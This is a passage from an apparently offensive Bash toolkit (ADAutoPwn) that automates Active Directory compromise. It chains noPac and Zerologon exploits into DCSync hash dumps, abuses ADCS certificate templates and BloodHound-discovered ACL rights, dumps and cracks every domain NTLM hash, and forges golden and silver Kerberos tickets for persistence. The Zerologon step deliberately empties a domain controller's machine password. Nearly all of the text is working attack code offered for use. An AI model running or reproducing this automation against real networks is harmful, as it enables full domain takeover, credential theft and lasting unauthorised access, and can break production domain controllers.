        loot "Potential AD CVE/coercion finding(s) → $(basename "$out")"
        if grep -qiE 'zerologon|CVE-2020-1472' "$out" 2>/dev/null; then
            warn "Zerologon exploitation resets the DC machine password; ADAutoPwn only checks it automatically."
        fi
        [[ "$DO_ABUSE" == "1" ]] && info "NoPAC is handled by the external noPac wrapper, not the noisy NetExec module"
    else
        info "No positive CVE module result (or modules unavailable in this NetExec build)"
        rm -f "$out"
    fi
}

phase_nopac_abuse() {
    [[ "$HAVE_AUTH" != "1" || "$DO_ABUSE" != "1" ]] && return
    [[ "$IS_DC_ADMIN" == "1" ]] && return        # already own the DC → nothing to escalate
    [[ -z "$DOMAIN" || -z "$USER" ]] && return
    have python3 || return
    local np; np="$(external_tool noPac/noPac.py)"
    [[ -z "$np" ]] && return

    section "NoPAC ABUSE · CVE-2021-42278/42287 to Administrator"
    local principal="${DOMAIN}/${USER}" auth=() envp=()
    if [[ -n "$PASS" ]]; then
        principal="${principal}:${PASS}"
    elif [[ -n "$HASH" ]]; then
        auth=(-hashes ":$HASH")
    elif [[ -n "$KERB_TICKET" ]]; then
        auth=(-k -no-pass); envp=(env "KRB5CCNAME=$KERB_TICKET")
    else
        info "No reusable auth material for noPac; skipping"
        return
    fi

    local common=(-dc-ip "$DC_IP")
    [[ -n "$DC_HOST" ]] && common+=(-dc-host "$DC_HOST")

    local scan="$OUTDIR/nopac_scan_$(_safe_name "$USER").txt"
    local scanner; scanner="$(external_tool noPac/scanner.py)"
    if [[ -n "$scanner" ]]; then
        subsection "NoPAC scanner"
        run "python3 scanner.py ${principal/:*/:***} ${common[*]} ${auth[*]}"
        ( cd "$(dirname "$np")" && "${envp[@]}" python3 "$scanner" "$principal" "${common[@]}" "${auth[@]}" 2>&1 ) \
            | tee -a "$LOGFILE" | tee "$scan"
        if grep -qiE 'not vulnerable|patched|failed' "$scan" 2>/dev/null && ! grep -qiE 'vulnerable|CVE-2021-42278|CVE-2021-42287' "$scan" 2>/dev/null; then
            info "NoPAC scanner did not report a vulnerable chain"
            return
        fi
    fi

    local out="$OUTDIR/nopac_abuse_$(_safe_name "$USER").txt"
    subsection "NoPAC exploit + DCSync dump"
    run "python3 noPac.py ${principal/:*/:***} ${common[*]} ${auth[*]} --impersonate administrator -dump -just-dc"
    ( cd "$(dirname "$np")" && "${envp[@]}" python3 "$np" "$principal" "${common[@]}" "${auth[@]}" --impersonate administrator -dump -just-dc 2>&1 ) \
        | tee -a "$LOGFILE" | tee "$out"

    if grep -qE ':::' "$out" 2>/dev/null; then
        ingest_dcsync_output "$out" "NoPAC CVE-2021-42278/42287"
    else
        warn "NoPAC did not produce DCSync hashes for $USER"
    fi
}

# ===========================================================================
#  ZEROLOGON  —  CVE-2020-1472 exploit WITH mandatory safe restore.
#  DESTRUCTIVE: zeroes the DC machine-account password, so the secure channel is
#  broken until we set it back. We only fire when (a) --abuse is set AND (b) the
#  DC actually tests vulnerable, then immediately recover the original machine
#  password (hex, from LSA secrets) and restore it. The restore is retried and,
#  if it ever fails, the exact manual command is saved + screamed to the user.
# ===========================================================================
ZEROLOGON_DONE=0
phase_zerologon_abuse() {
    [[ "$ZEROLOGON_DONE" == "1" ]] && return
    [[ "$DEEP_CVE" != "1" ]] && return                       # off by default (slow/noisy; modern DCs immune) → --deep-cve
    [[ "$DO_ABUSE" != "1" ]] && return                       # opt-in: it's destructive
    [[ "$IS_DC_ADMIN" == "1" ]] && return                    # already own the DC
    [[ -z "$DC_HOST" || -z "$DC_IP" || -z "$DOMAIN" ]] && return
    have impacket-secretsdump || return
    local xpl rst; xpl="$(external_tool CVE-2020-1472/cve-2020-1472-exploit.py)"
    rst="$(external_tool CVE-2020-1472/restorepassword.py)"
    [[ -z "$xpl" || -z "$rst" ]] && return
    ZEROLOGON_DONE=1

    section "ZEROLOGON ABUSE · CVE-2020-1472 (exploit + SAFE restore)"

    # 1) Vulnerability check FIRST — never blind-exploit a (possibly patched) DC.
    subsection "Zerologon vulnerability check"
    local chk; chk=$($NXC smb "$DCT" -u '' -p '' -M zerologon 2>&1); echo "$chk" | tee -a "$LOGFILE"
    if ! grep -qiE 'VULNERABLE|is vulnerable' <<<"$chk"; then
        info "DC not reported vulnerable to Zerologon → skipping (nothing fired, DC untouched)"
        return
    fi
    loot "DC tests VULNERABLE to Zerologon → exploiting, then restoring"
    warn "DESTRUCTIVE step: zeroing the DC machine password now. Auto-restore follows — do NOT interrupt."

    # 2) Exploit → DC machine-account password becomes empty.
    subsection "Setting DC machine-account password to empty"
    run "python3 cve-2020-1472-exploit.py $DC_HOST $DC_IP"
    local xo; xo=$( python3 "$xpl" "$DC_HOST" "$DC_IP" 2>&1 ); echo "$xo" | tee -a "$LOGFILE"
    if ! grep -qiE 'Exploit complete' <<<"$xo"; then
        warn "Exploit did not confirm success ('Exploit complete!') — aborting; machine pw should be untouched"
        return
    fi
    rb_record "Zerologon: DC '$DC_HOST' machine password zeroed" \
              "echo 'If auto-restore failed, run: python3 $rst $DOMAIN/$DC_HOST\$@$DC_HOST -target-ip $DC_IP -hexpass <ORIG_HEX from $OUTDIR/zerologon_localsecrets.txt>'"

    # 3) DCSync as the zeroed machine account → Administrator NT hash.
    subsection "DCSync via empty machine-account password"
    local d1="$OUTDIR/zerologon_dcsync.txt"
    run "impacket-secretsdump -no-pass $DOMAIN/$DC_HOST\$@$DC_IP -just-dc"
    impacket-secretsdump -no-pass "$DOMAIN/$DC_HOST\$@$DC_IP" -just-dc 2>&1 | tee -a "$LOGFILE" | tee "$d1"
    local admin_nt; admin_nt=$(grep -iE '^administrator:' "$d1" | head -1 | cut -d: -f4)

    # 4) Recover the ORIGINAL machine password (hex) needed by the restore.
    local orig_hex="" d2="$OUTDIR/zerologon_localsecrets.txt"
    if [[ -n "$admin_nt" ]]; then
        subsection "Recovering original machine password (LSA secrets) for restore"
        impacket-secretsdump -hashes ":$admin_nt" "$DOMAIN/Administrator@$DC_IP" 2>&1 | tee -a "$LOGFILE" | tee "$d2"
        orig_hex=$(grep -oiP '\$MACHINE\.ACC:\s*plain_password_hex:\K[0-9a-fA-F]+' "$d2" | head -1)
    fi

    # 5) RESTORE — mandatory + retried. A zeroed DC breaks the whole domain.
    if [[ -n "$orig_hex" ]]; then
        subsection "Restoring DC machine-account password"
        run "python3 restorepassword.py $DOMAIN/$DC_HOST\$@$DC_HOST -target-ip $DC_IP -hexpass <orig>"
        local ro tries=0 ok=0
        while (( tries++ < 3 )); do
            ro=$( python3 "$rst" "$DOMAIN/$DC_HOST\$@$DC_HOST" -target-ip "$DC_IP" -hexpass "$orig_hex" 2>&1 ); echo "$ro" | tee -a "$LOGFILE"
            grep -qiE 'Change password OK' <<<"$ro" && { ok=1; break; }
            sleep 3
        done
        if [[ "$ok" == "1" ]]; then
            loot "★ DC machine-account password RESTORED — secure channel healthy again"
        else
            err "RESTORE FAILED after 3 tries! The DC secure channel is BROKEN — restore it NOW:"
            err "  python3 $rst '$DOMAIN/$DC_HOST\$@$DC_HOST' -target-ip $DC_IP -hexpass $orig_hex"
            echo "python3 '$rst' '$DOMAIN/$DC_HOST\$@$DC_HOST' -target-ip $DC_IP -hexpass $orig_hex" >"$OUTDIR/ZEROLOGON_RESTORE_COMMAND.txt"
        fi
    else
        err "Could not recover the original machine password (no Administrator hash / no LSA hex)."
        err "DC machine password is STILL EMPTY. Recover the hex and restore manually:"
        err "  impacket-secretsdump -hashes :<admin_nt> $DOMAIN/Administrator@$DC_IP   # grep \$MACHINE.ACC plain_password_hex"
        err "  python3 $rst '$DOMAIN/$DC_HOST\$@$DC_HOST' -target-ip $DC_IP -hexpass <hex>"
    fi

    # 6) Ingest the domain hashes (queues Administrator, marks us DC admin).
    if grep -qE ':::' "$d1" 2>/dev/null; then
        ingest_dcsync_output "$d1" "Zerologon CVE-2020-1472"
        IS_DC_ADMIN=1
    fi
}

# ===========================================================================
#  PHASE 7 — ADCS / CERTIPY  (vulnerable certificate templates)
# ===========================================================================
# Parse a full `certipy find -stdout` dump (on stdin) and report which ENABLED
# templates the current identity (sAMAccountName + its group memberships) can
# ENROLL in, with the ESC-relevant flags. Prints a line per enrollable template;
# lines starting with ★ are ESC1-like (Enrollee-Supplies-Subject + ClientAuth +
# no manager approval → request a cert for ANY user). Env: ADCS_PRINC, ADCS_GROUPS.
_adcs_template_review() {
    python3 - <<'PY'
import sys, os, re
txt = sys.stdin.read()
princ = os.environ.get('ADCS_PRINC', '').strip().lower()
groups = os.environ.get('ADCS_GROUPS', '')
mine = {princ} if princ else set()
for g in re.split(r'[,\|]', groups):
    g = g.strip().lower()
    if g:
        mine.add(g)
# buckets that almost always grant enrolment to a machine/low-priv principal
mine |= {'domain computers', 'domain users', 'authenticated users', 'everyone',
         'certificate service dcom access', 'users'}
blocks = re.split(r'\n(?=\s{2,}\d+\s*\n)', txt)
def field(b, key):
    m = re.search(r'^\s*' + re.escape(key) + r'\s*:\s*(.+)$', b, re.M)
    return m.group(1).strip() if m else ''
def rights(b):
    m = re.search(r'Enrollment Rights\s*:\s*(.+(?:\n\s{18,}\S.*)*)', b)
    return [l.strip() for l in m.group(1).splitlines() if l.strip()] if m else []
shown = 0
for b in blocks:
    name = field(b, 'Template Name')
    if not name or field(b, 'Enabled').lower() != 'true':
        continue
    ess  = field(b, 'Enrollee Supplies Subject').lower() == 'true'
    eku  = field(b, 'Extended Key Usage')
    ekul = eku.lower()
    ca   = ('client authentication' in ekul) or field(b, 'Client Authentication').lower() == 'true'
    sa   = 'server authentication' in ekul
    anyp = ('any purpose' in ekul) or (ekul.strip() == '')
    appr = field(b, 'Requires Manager Approval').lower() == 'true'
    er   = rights(b)
    can  = any(any(m in r.lower() for m in mine) for r in er)
    # Surface a template if it lets the ENROLLEE SUPPLY THE SUBJECT (ESS — the core
    # ESC1/ESC15/cert-for-any-host primitive), OR we can enroll with a client-auth
    # EKU. CRITICAL: show ESS templates we CANNOT enroll too — they reveal the
    # target + which group to pivot to (e.g. an UpdateSrv/ServerAuth template only
    # 'IT' can enroll, abused via the WSUS HTTPS-spoof chain).
    if not (ess or (can and ca)):
        continue
    shown += 1
    er_s = '; '.join(er) or '?'
    tags = [t for t, c in [('ESS', ess), ('ClientAuth', ca), ('ServerAuth', sa),
                           ('AnyPurpose', anyp), ('ManagerApproval', appr)] if c]
    if can and ess and (ca or anyp) and not appr:
        print(f"★ {name}  [{', '.join(tags)}]  enroll: {er_s}")
        print(f"    ESC1 (you CAN enroll): certipy req -template '{name}' -upn administrator@<domain>")
    elif ess and not can:
        print(f"⚑ {name}  [{', '.join(tags)}]  enroll: {er_s}")
        print(f"    abusable but you must become a member of: {er_s}")
        if sa:
            print(f"    ServerAuth + ESS -> request a cert for ANY host (e.g. the WSUS server) -> WSUS HTTPS spoof / relay")
    else:
        print(f"- {name}  [{', '.join(tags)}]  enroll: {er_s}")
if shown == 0:
    print("(no enabled template with enrollee-supplies-subject or client-auth)")
PY
}

ADCS_PWNED=0       # set once an ESC yields Administrator → stop re-issuing certs
phase_adcs() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "PHASE 7 · ADCS — VULNERABLE CERTIFICATE TEMPLATES (Certipy)"
    have certipy || { warn "certipy unavailable, skipping"; return; }
    [[ "$ADCS_PWNED" == "1" ]] && { info "Already escalated to Administrator via ADCS — skipping"; return; }

    # IMPORTANT: `certipy find -vulnerable` flags a template as abusable only if THE
    # CURRENT USER can enrol in it — so abusability is PER-IDENTITY, not domain-wide.
    # A template (e.g. an ESC15 WebServer) may be invisible to the first user yet
    # exploitable by a later pivot that holds enrolment rights. That's why we re-run
    # the scan for each identity (the timeout -k guard keeps a hang from stalling us).
    subsection "certipy find — what THIS identity (${USER}) can abuse (ESC1..ESC16)"
    # certipy's Kerberos LDAP bind is unreliable (fails 'invalidCredentials data
    # 52e/57'), and most labs keep NTLM enabled — PREFER password/hash + -target;
    # fall back to Kerberos only when that's all we have or NTLM is refused.
    local cbase=(-u "${USER}@${DOMAIN}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}") cauth=() cenv=() cout
    # Protected Users can't do NTLM and certipy derives an RC4 Kerberos key from -p
    # (rejected → 'data 57'), so for those accounts go Kerberos-FIRST with the AES
    # ccache (now that the per-run krb5.conf realm is correct). This stops us missing
    # a Protected-Users account's whole ADCS/ESC surface.
    local _prot=0; [[ "${OWNED_GROUPS[${USER,,}]:-}" == *"Protected Users"* ]] && _prot=1
    if   [[ "$_prot" == "1" && -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET")
    elif [[ -n "$PASS" ]]; then cauth=(-p "$PASS"); cenv=(env -u KRB5CCNAME)
    elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH"); cenv=(env -u KRB5CCNAME)
    elif [[ -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET"); fi
    run "certipy find ${cbase[*]} ${cauth[*]} -stdout -vulnerable"
    cout=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
    if grep -qiE 'authentication failed|invalidCredentials|NTLM.*failed|STATUS_' <<<"$cout" \
       && [[ -n "$KERB_TICKET" && "${cauth[0]}" != "-k" ]]; then
        warn "certipy password/NTLM bind failed → retrying over Kerberos"
        cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET")
        cout=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
    fi
    echo "$cout" | tee -a "$LOGFILE"; echo "$cout" >"$OUTDIR/certipy_find_$(_safe_name "$USER").txt"

    local ca; ca=$(grep -ioP 'CA Name\s*:\s*\K\S+' <<<"$cout" | head -1)
    if grep -qiE 'ESC[0-9]+' <<<"$cout"; then
        local escs; escs=$(grep -oiE 'ESC[0-9]+' <<<"$cout" | sort -u | tr '\n' ' ')
        loot "★★★ ${USER} can abuse ADCS: $escs ★★★"
        grep -iE 'Template Name|ESC[0-9]+|Enrollment Rights|Vulnerab' <<<"$cout" | sed 's/^/      /'
        # structured dump for analysis (best-effort)
        "${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" "${cauth[@]}" -output "$OUTDIR/certipy_$(_safe_name "$USER")" >/dev/null 2>&1
        _abuse_adcs "$cout" && ADCS_PWNED=1
    elif [[ "$DEEP_CVE" == "1" ]]; then
        # OPT-IN only (--deep-cve): the full review runs a SECOND certipy enumeration
        # (slow — CA config via RRP), so it's off by default. It maps every enrollable
        # ESS/abusable template incl. ones restricted to another group (pivot target).
        info "Nothing flagged by -vulnerable — mapping the FULL template surface (--deep-cve)…"
        subsection "Template review — ESS/abusable templates (★=you can enroll · ⚑=need another group)"
        local full; full=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" -stdout 2>&1)
        echo "$full" >"$OUTDIR/certipy_templates_$(_safe_name "$USER").txt"
        local rev; rev=$(ADCS_PRINC="${USER%\$}" ADCS_GROUPS="${OWNED_GROUPS[${USER,,}]:-}" _adcs_template_review <<<"$full")
        printf '%s\n' "$rev" | while IFS= read -r l; do
            case "$l" in
                ★*) loot "  ${C_GREEN}${C_BOLD}$l${C_RESET}" ;;
                ⚑*) loot "  ${C_YELLOW}${C_BOLD}$l${C_RESET}" ;;
                *)  detail "      $l" ;;
            esac
        done
        if grep -q '★' <<<"$rev"; then
            loot "★ ESC1-like enrollable template → certipy req -ca '$ca' -template <T> -upn administrator@$DOMAIN (SAN impersonation)"
        elif grep -q '⚑' <<<"$rev"; then
            loot "⚑ ESS template(s) exist but need a group you don't hold yet → pivot to that group, then enroll (note ServerAuth+ESS → WSUS HTTPS-spoof chain)"
        fi
    else
        info "No templates ${USER} can abuse (certipy -vulnerable clean; run with --deep-cve for a full enrollable-template review)"
    fi
    # ESC15/EKUwu is the blind spot: certipy -vulnerable frequently does NOT flag it
    # even on a default v1 template (WebServer/SubCA) that ANY enrolment-capable user
    # can abuse. So if we haven't reached Administrator, try ESC15 generically against
    # whatever templates THIS identity can enrol (parsed, not hard-coded).
    if [[ "$ADCS_PWNED" != "1" && "$DO_ABUSE" == "1" && -n "$ca" ]]; then
        _adcs_esc15_blind "$ca" && ADCS_PWNED=1
    fi
}

# ===========================================================================
#  PHASE 8 — BLOODHOUND COLLECTION
# ===========================================================================
# ===========================================================================
#  BLOODHOUND-DRIVEN ABUSE  —  mine the collected BH data for the current user's
#  outbound abusable edges and feed them to the same abuse engine. This COMPLEMENTS
#  `bloodyAD get writable`: the two disagree often — bloodyAD misses constrained
#  rights like AddSelf/AddMember over groups (Self-Membership), while BH may miss
#  things bloodyAD sees — so we run BOTH and dedup, for graph-parity coverage.
# ===========================================================================
_bh_latest_zip() { ls -t "$OUTDIR"/bloodhound/*_bloodhound.zip "$OUTDIR"/bloodhound/*.zip 2>/dev/null | head -1; }

# env: BHZIP=<zip> OWNER=<sAMAccountName> → prints "RightName<TAB>targetSAM<TAB>targetType"
_bh_outbound_edges_py() {
python3 - <<'PYEOF'
import os, sys, json, zipfile
zf=os.environ.get("BHZIP",""); owner=os.environ.get("OWNER","").lower()
if not zf or not os.path.exists(zf) or not owner: sys.exit(0)
data={}
try:
    with zipfile.ZipFile(zf) as z:
        for n in z.namelist():
            if n.lower().endswith(".json"):
                try: data[n]=json.load(z.open(n))
                except Exception: pass
except Exception: sys.exit(0)
def short(s): return str(s or "").split("@")[0]
objs=[]; owner_sid=None
for fn,doc in data.items():
    low=fn.lower()
    typ=("User" if "users" in low else "Group" if "groups" in low else
         "Computer" if "computers" in low else "OU" if "ous" in low else "Base")
    for o in (doc.get("data") or []):
        oid=o.get("ObjectIdentifier") or ""
        props=o.get("Properties") or {}
        sam=short(props.get("samaccountname") or props.get("name") or oid)
        objs.append((sam,typ,o.get("Aces") or []))
        if owner in (sam.lower(), short(props.get("name","")).lower()): owner_sid=oid
if not owner_sid: sys.exit(0)
ABUSABLE={"GenericAll","GenericWrite","WriteDacl","WriteOwner","Owns","AddMember","AddSelf",
          "ForceChangePassword","AllExtendedRights","AddKeyCredentialLink","WriteSPN","AddAllowedToAct",
          "ReadGMSAPassword","ReadLAPSPassword"}
seen=set()
for sam,typ,aces in objs:
    for a in aces:
        r=a.get("RightName")
        if a.get("PrincipalSID","")==owner_sid and r in ABUSABLE:
            k=(r,sam,typ)
            if k in seen: continue
            seen.add(k); print("%s\t%s\t%s"%(r,sam,typ))
PYEOF
}

phase_bh_abuse() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    local zip; zip=$(_bh_latest_zip); [[ -z "$zip" ]] && return
    local edges; edges=$(BHZIP="$zip" OWNER="$USER" _bh_outbound_edges_py 2>/dev/null)
    [[ -z "$edges" ]] && return
    section "BLOODHOUND-DRIVEN ABUSE · ${USER}'s outbound rights (graph parity)"
    [[ "$DO_ABUSE" != "1" ]] && info "  (report-only; --abuse to act on these BloodHound edges)"
    local right tgt cls dk
    while IFS=$'\t' read -r right tgt cls; do
        [[ -z "$right" || -z "$tgt" ]] && continue
        dk="${tgt,,}:${right,,}"
        [[ -n "${ABUSED_GLOBAL[$dk]:-}" ]] && continue   # already handled (here or in the ACL phase)
        ABUSED_GLOBAL["$dk"]=1
        loot "BH edge: ${C_BOLD}${USER}${C_RESET} --${C_PURPLE}${right}${C_RESET}→ ${C_BOLD}${tgt}${C_RESET} (${cls})"
        [[ "$DO_ABUSE" != "1" ]] && continue
        case "$right" in
            AddMember|AddSelf)     _abuse_group "$tgt" ;;
            AddKeyCredentialLink)  _abuse_shadowcred "$tgt" ;;
            WriteSPN)              _abuse_writespn "$tgt" ;;
            AddAllowedToAct)       _abuse_rbcd "$tgt" ;;
            ForceChangePassword)   _abuse_user "$tgt" ;;
            ReadGMSAPassword|ReadLAPSPassword) info "  → secret read handled in the Secrets phase" ;;
            GenericWrite)
                case "$cls" in
                    Group)    _abuse_group "$tgt" ;;
                    Computer) _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt" ;;
                    OU)       loot "GenericWrite over OU '$tgt' → restore handled in the lifecycle phase if deleted children are writable" ;;
                    *)        if [[ "$tgt" == *\$ ]]; then _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt"
                              else _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt"; fi ;;
                esac ;;
            GenericAll|AllExtendedRights)
                case "$cls" in
                    Group)    _abuse_group "$tgt" ;;
                    Computer) _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt" ;;
                    OU)       loot "GenericAll over OU '$tgt' → restore handled in the lifecycle phase" ;;
                    *)        if [[ "$tgt" == *\$ ]]; then _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt"
                              else _abuse_user_smart "$tgt"; fi ;;
                esac ;;
            WriteDacl|WriteOwner|Owns)
                case "$cls" in
                    Group)    _abuse_group "$tgt" ;;
                    Computer) _abuse_acl_takeover "$tgt" || _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt" ;;
                    OU)       loot "${right} over OU '$tgt' → restore handled in the lifecycle phase" ;;
                    *)        _abuse_acl_takeover "$tgt" ;;
                esac ;;
        esac
    done <<<"$edges"
}

phase_bloodhound() {
    [[ "$HAVE_AUTH" != "1" || "$DO_BLOODHOUND" != "1" ]] && return
    section "PHASE 8 · BLOODHOUND — ATTACK GRAPH COLLECTION"
    have bloodhound-python || { warn "bloodhound-python unavailable, skipping"; return; }

    subsection "Collecting all methods (All)"
    local bh_out="$OUTDIR/bloodhound"; mkdir -p "$bh_out"
    local bargs=(-d "$DOMAIN" -u "$USER" -ns "$DC_IP" -c All --zip)
    [[ -n "$HASH" ]] && bargs+=(--hashes ":$HASH")
    [[ -n "$PASS" ]] && bargs+=(-p "$PASS")
    [[ "$KERBEROS" == "1" ]] && bargs+=(-k --dns-tcp)
    run "bloodhound-python ${bargs[*]}"
    ( cd "$bh_out" && bloodhound-python "${bargs[@]}" 2>&1 ) | tail -30 | tee -a "$LOGFILE"
    local zip; zip=$(ls -t "$bh_out"/*.zip 2>/dev/null | head -1)
    [[ -n "$zip" ]] && loot "BloodHound data ready → $zip (import into the GUI)"
}

# ===========================================================================
#  PHASE 9 — DCSYNC / SECRETSDUMP
# ===========================================================================
phase_dcsync() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "PHASE 9 · DCSYNC / SECRETSDUMP — DOMAIN HASH DUMP"
    have impacket-secretsdump || { warn "impacket-secretsdump unavailable, skipping"; return; }
    local outf="$OUTDIR/secretsdump.txt"

    subsection "Attempting DCSync (requires DA / replication rights)"
    info "If this fails, the current account lacks the privileges — that's expected."
    if [[ -n "$KERB_TICKET" ]]; then
        run "KRB5CCNAME=$KERB_TICKET impacket-secretsdump -k -no-pass ${DC_FQDN:-$DC_IP} -just-dc"
        KRB5CCNAME="$KERB_TICKET" impacket-secretsdump -k -no-pass "${DC_FQDN:-$DC_IP}" -just-dc -outputfile "$OUTDIR/dcsync" 2>&1 | tee -a "$LOGFILE" | tee "$outf"
    elif [[ -n "$HASH" ]]; then
        run "impacket-secretsdump $(imp_principal)@$DC_IP -hashes :$HASH -just-dc"
        impacket-secretsdump "$(imp_principal)@$DC_IP" -hashes ":$HASH" -just-dc -outputfile "$OUTDIR/dcsync" 2>&1 | tee -a "$LOGFILE" | tee "$outf"
    else
        run "impacket-secretsdump $(imp_principal):***@$DC_IP -just-dc"
        impacket-secretsdump "$(imp_principal):${PASS}@$DC_IP" -just-dc -outputfile "$OUTDIR/dcsync" 2>&1 | tee -a "$LOGFILE" | tee "$outf"
    fi

    if grep -qE ':::' "$outf" 2>/dev/null; then
        loot "★★★★★ DCSYNC SUCCESSFUL — ENTIRE DOMAIN NTLM HASHES DUMPED ★★★★★"
        ok "$(grep -cE ':::' "$outf") NTLM hashes dumped:"
        grep -E ':::' "$outf" | while read -r line; do
            local u nt; u=$(echo "$line" | cut -d: -f1); nt=$(echo "$line" | cut -d: -f4)
            echo -e "      ${C_RED}${C_BOLD}$u${C_RESET} : ${C_MAGENTA}$nt${C_RESET}"
        done
        grep -iE '^administrator:' "$outf" | head -1 | while read -r l; do
            loot "ADMINISTRATOR HASH: $(echo "$l" | cut -d: -f4)"
        done
        ok "Full dump in secretsdump.txt → Pass-the-Hash ready"
        if [[ "$IS_DC_ADMIN" == "1" ]]; then
            info "Skipping NTLM cracking — already DC admin: every hash is Pass-the-Hash ready (ntlm_hashes.txt)"
            grep -E ':::' "$outf" | awk -F: '{print $4}' | sort -u >"$OUTDIR/ntlm_hashes.txt"
        elif [[ "$DO_CRACK" == "1" ]]; then
            grep -E ':::' "$outf" | awk -F: '{print $4}' | sort -u >"$OUTDIR/ntlm_hashes.txt"
            crack_hashes "$OUTDIR/ntlm_hashes.txt" 1000 "NTLM"
        fi
    else
        warn "DCSync not authorized with these credentials (not DA / no replication rights)"
    fi
}

ingest_dcsync_output() {
    local src="$1" via="${2:-external exploit}"
    [[ ! -s "$src" ]] && return 1
    grep -E ':::' "$src" >>"$OUTDIR/secretsdump.txt" 2>/dev/null || return 1
    sort -u -o "$OUTDIR/secretsdump.txt" "$OUTDIR/secretsdump.txt" 2>/dev/null
    loot "★★★★★ DOMAIN HASHES INGESTED from ${via} ★★★★★"
    local admin_hash
    admin_hash=$(grep -iE '^(.*\\)?administrator:' "$OUTDIR/secretsdump.txt" 2>/dev/null | head -1 | cut -d: -f4)
    if [[ -n "$admin_hash" ]]; then
        loot "ADMINISTRATOR HASH: $admin_hash"
        note_cred_source "Administrator" "$via"
        queue_cred "Administrator" "" "$admin_hash" "$via"
    fi
    grep -E ':::' "$OUTDIR/secretsdump.txt" | awk -F: '{print $4}' | sort -u >"$OUTDIR/ntlm_hashes.txt"
    return 0
}

# ===========================================================================
#  POST-DOMAIN-ADMIN  —  DSRM read + Golden/Silver ticket forging (persistence)
#  PRECONDITION-GATED: this is only reachable once we ALREADY hold krbtgt (full
#  DA) — you cannot forge a golden ticket otherwise, so it never "attacks" a
#  target it hasn't already owned. If there's no krbtgt in the dump, it no-ops.
#  Fully automatic under --abuse — no prompts.
# ===========================================================================
POST_DA_DONE=0
phase_post_da() {
    [[ "$POST_DA_DONE" == "1" ]] && return
    [[ "$IS_DC_ADMIN" != "1" || "$DO_ABUSE" != "1" ]] && return
    local dump="$OUTDIR/secretsdump.txt"; [[ ! -s "$dump" ]] && return
    local krbtgt; krbtgt=$(grep -iE '^krbtgt:' "$dump" | head -1 | cut -d: -f4)
    [[ -z "$krbtgt" ]] && return                 # no krbtgt → forging impossible → not abusable
    have impacket-ticketer || return
    POST_DA_DONE=1
    section "POST-DOMAIN-ADMIN · DSRM + GOLDEN/SILVER TICKETS (persistence)"
    info "Reachable only because we already hold krbtgt (full DA) — pure persistence material."

    # Admin auth context for the registry/SID reads (reuse whatever DA creds we hold).
    local -a aenv=() targ=()
    if [[ -n "$KERB_TICKET" ]]; then aenv=(env "KRB5CCNAME=$KERB_TICKET"); targ=(-k -no-pass "${DC_FQDN:-$DC_IP}")
    elif [[ -n "$HASH" ]]; then targ=("${DOMAIN}/${USER}@${DC_IP}" -hashes ":$HASH")
    elif [[ -n "$PASS" ]]; then targ=("${DOMAIN}/${USER}:${PASS}@${DC_IP}")
    else local ah; ah=$(grep -iE '^administrator:' "$dump" | head -1 | cut -d: -f4)
         [[ -n "$ah" ]] && targ=("${DOMAIN}/Administrator@${DC_IP}" -hashes ":$ah"); fi
    [[ ${#targ[@]} -eq 0 ]] && { warn "No DA auth context for DSRM/SID reads — skipping"; return; }

    # --- DSRM: the DC's LOCAL SAM Administrator (Directory Services Restore Mode) ---
    subsection "DSRM hash (DC local SAM Administrator)"
    local dsrm="$OUTDIR/dsrm.txt"
    "${aenv[@]}" impacket-secretsdump "${targ[@]}" -sam 2>&1 | tee -a "$LOGFILE" | tee "$dsrm"
    local dsrm_h; dsrm_h=$(grep -iE '^Administrator:500:' "$dsrm" | head -1 | cut -d: -f4)
    [[ -n "$dsrm_h" ]] && loot "DSRM (DC local admin) NT hash: ${C_MAGENTA}$dsrm_h${C_RESET} → dsrm.txt (offline persistence)"

    # --- Domain SID (required to forge tickets) ---
    local sid
    sid=$( "${aenv[@]}" impacket-lookupsid "${targ[@]}" 2>/dev/null \
           | grep -oiP 'Domain SID is:\s*\KS-1-5-21-[0-9-]+' | head -1 )
    [[ -z "$sid" ]] && { warn "Could not resolve domain SID → skipping ticket forging (DSRM still saved)"; return; }

    # --- GOLDEN ticket: krbtgt hash → Administrator (domain-wide, long-lived) ---
    subsection "Golden ticket (krbtgt) → Administrator"
    run "impacket-ticketer -nthash <krbtgt> -domain-sid $sid -domain $DOMAIN Administrator"
    ( cd "$OUTDIR" && impacket-ticketer -nthash "$krbtgt" -domain-sid "$sid" -domain "$DOMAIN" Administrator >/dev/null 2>&1 \
        && mv -f Administrator.ccache golden_Administrator.ccache 2>/dev/null )
    [[ -f "$OUTDIR/golden_Administrator.ccache" ]] \
        && loot "★ Golden ticket forged → golden_Administrator.ccache  (export KRB5CCNAME=… for DA persistence)"

    # --- SILVER ticket: DC machine hash → CIFS service on the DC (host-scoped) ---
    local dchash; dchash=$(grep -iE "^${DC_HOST}\\\$:" "$dump" | head -1 | cut -d: -f4)
    if [[ -n "$dchash" && -n "$DC_FQDN" ]]; then
        subsection "Silver ticket (DC machine hash) → cifs/${DC_FQDN}"
